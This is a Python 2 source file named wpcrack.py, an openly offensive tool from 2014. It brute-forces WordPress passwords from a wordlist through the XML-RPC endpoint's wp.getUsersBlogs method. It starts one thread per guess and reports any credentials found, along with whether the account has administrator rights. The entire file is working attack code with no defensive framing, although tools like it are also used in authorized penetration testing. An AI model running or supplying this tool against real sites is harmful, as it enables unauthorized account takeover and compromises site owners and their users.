#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
 Name: wpcrack.py
 Date: 21/09/2014
 Version: v0.1

 Summary

  Wordpress user's dictionary attack through the XML-RPC service.

 Author:
  Vte. J. Garcia Mayen <jgarcia(at)seinhe.com>

 Copyright (c) 2014 seinhe.com

 This program is free software; you can redistribute it and/or modify it
 under the terms of the GNU General Public License as published by the
 Free Software Foundation; either version 2 of the License, or (at your
 option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
 the full text of the license.
"""
import requests
import threading
from os import _exit
from lxml import etree

LOCK = threading.Semaphore(value=1)

def send_post_request(url, data):
    """ Function that sends a post request and returns the response content """

    try:
        req = requests.post(url, data, timeout = 5)
    except requests.exceptions.RequestException as retexception:
        LOCK.acquire()
        print "[Error] " + str(retexception)
        _exit(1)

    return unicode(req.text).encode('utf-8')


def build_xml_data(username, password):
    """ Function that generates the correct xml text to send """

    data  = "<?xml version='1.0' encoding='utf-8'?>"
    data += "<methodCall>"
    data += "  <methodName>wp.getUsersBlogs</methodName>"
    data += "  <params>"
    data += "    <param><value>%s</value></param>" % username
    data += "    <param><value>%s</value></param>" % password
    data += "  </params>"
    data += "</methodCall>"

    return data


def parse_post_response(response):
    """ Function that analyzes the xml server response """

    tree = etree.fromstring(response)

    if tree.xpath(".//name[text()='isAdmin']"):
        return tree.find(".//boolean").text

    if "XML-RPC" in tree.find(".//string").text:
        print "[-] %s" % tree.find(".//string").text
        _exit(1)

    return None


def do_brute_force(url, username, password, quiet):
    """ Function that launchs the actions to brute forcing the target """

    data = build_xml_data(username, password)
    response = send_post_request(url, data)
    result = parse_post_response(response)
    if result:
        LOCK.acquire()
        print "\n[+] Username: %s" % username
        print "[+] Password: %s" % password
        if bool(result):
            print "[+] Profile : administrator"
        _exit(0)
    else:
        if not quiet:
            LOCK.acquire()
            print "[-] The password '%s' doesn't match" % password
            LOCK.release()


def main(args):
    """ Main function """

    url = args.url + "/xmlrpc.php"
    try:
        resp = requests.get(url, timeout = 5)
    except requests.exceptions.RequestException as retexception:
        print "[Error] " + str(retexception)
        exit(1)

    if requests.codes.ok != resp.status_code:
        print "[Error] The xmlrpc.php script is not found"
        exit(1)

    try:
        wordlist = open(args.wordlist)
    except IOError as reterror:
        print str(reterror).encode('utf8')
        exit(1)

    for line in wordlist.readlines():
        password = line.strip('\n')
        threading.Thread(
            target = do_brute_force,
            args = (url, args.username, password, args.quiet)
        ).start()


if __name__ == "__main__":

    import argparse

    ARGVPARSER = argparse.ArgumentParser(
        description  = "Wordpress user's dictionary attack through "
                       "the XML-RPC service. If the user's password"
                       " is found the credentials will be show. "
                       "Additionally, if the guessed password belongs"
                       " to a user with the administrator role that"
                       " will be also show.",
        epilog = "Copyright (c) 2014 SEINHE, http://www.seinhe.com",
        add_help =True,
        version = '%(prog)s v0.1'
        )

    ARGVPARSER.add_argument('url', action='store',
        help="The url for the wordpress site")

    ARGVPARSER.add_argument('wordlist', action='store',
        help="The dictionary file of passwords")

    ARGVPARSER.add_argument('-u', dest='username', default='admin',
        help='wordpress username (admin, by default)')

    ARGVPARSER.add_argument('-q', action='store_true', dest='quiet',
        default=False,
        help='don\'t show passwords that doesn\'t match')

    ARGS = ARGVPARSER.parse_args()

    main(ARGS)
